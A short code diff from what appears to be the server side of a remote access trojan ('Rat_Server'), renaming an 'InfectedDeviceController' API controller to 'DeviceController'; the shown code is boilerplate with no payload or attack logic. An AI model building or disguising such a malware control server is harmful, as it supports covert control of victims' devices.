@@ -13,12 +13,12 @@ namespace Rat_Server.Controllers
     /// </summary>
     [Route("api/[controller]")]
     [ApiController]
-    public class InfectedDeviceController : ControllerBase
+    public class DeviceController : ControllerBase
     {
         private readonly RatDbContext _context;
         private readonly IConfiguration _config;
 
-        public InfectedDeviceController(RatDbContext context, IConfiguration config)
+        public DeviceController(RatDbContext context, IConfiguration config)
         {
             _context = context;
             _config = config;
